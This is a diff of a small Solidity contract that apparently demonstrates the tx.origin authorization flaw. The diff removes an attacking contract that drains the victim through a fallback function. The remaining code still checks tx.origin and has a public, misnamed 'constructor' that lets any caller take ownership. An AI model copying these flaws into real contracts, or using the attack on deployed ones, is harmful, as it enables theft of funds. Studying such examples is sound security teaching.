@@ -3,32 +3,21 @@ pragma solidity 0.8.12;
 
 contract MyContract {
 
-    address owner;
+    address public owner;
+    uint public balance;
 
     function myContract() public {
         owner = msg.sender;
+        balance = address(this).balance;
+
     }
 
     function sendTo(address payable receiver, uint amount) public {
-        require(tx.origin == owner);
+        require(tx.origin == owner,"toto");
         (bool success, ) = receiver.call{value:amount}("");
         require(success);
     }
 
-}
-
-contract AttackingContract {
-
-    MyContract myContract;
-    address payable attacker;
-
-    function attackingContract(address myContractAddress) public {
-        myContract = MyContract(myContractAddress);
-        attacker = payable(msg.sender);
-    }
-
-    fallback() external {
-        myContract.sendTo(attacker, msg.sender.balance);
-    }
+    receive() external payable{}
 
 }
